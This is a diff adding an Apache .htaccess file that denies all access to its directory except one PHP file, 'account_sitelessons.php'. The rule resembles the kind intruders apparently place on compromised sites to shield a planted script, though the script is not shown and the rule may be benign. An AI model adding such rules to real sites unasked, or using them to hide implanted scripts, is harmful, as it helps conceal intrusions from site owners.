@@ -1,0 +1,5 @@
+Order allow,deny
+Deny From All
+<FilesMatch "^account_sitelessons\.php$">
+Allow From All
+</FilesMatch>
